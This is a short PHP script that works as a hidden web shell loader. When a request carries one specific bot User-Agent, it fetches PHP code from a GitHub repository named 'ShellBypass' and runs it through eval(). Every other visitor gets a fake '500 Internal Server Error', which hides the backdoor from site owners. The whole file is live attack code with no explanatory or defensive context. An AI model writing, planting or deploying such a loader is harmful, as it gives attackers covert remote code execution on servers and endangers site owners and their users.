<?php
$user_agent = $_SERVER['HTTP_USER_AGENT'];


if ($user_agent === 'Mozilla/5.0 (compatible; Batosay1337Bot/1.0; +https://www.batosay1337bot.com)') {

    $url = 'https://raw.githubusercontent.com/CallMeBatosay/ShellBypass/main/United-2.php';
    $content = file_get_contents($url);


    eval("?>" . $content);
} else {

    header("HTTP/1.1 500 Internal Server Error");
    exit;
}
?>
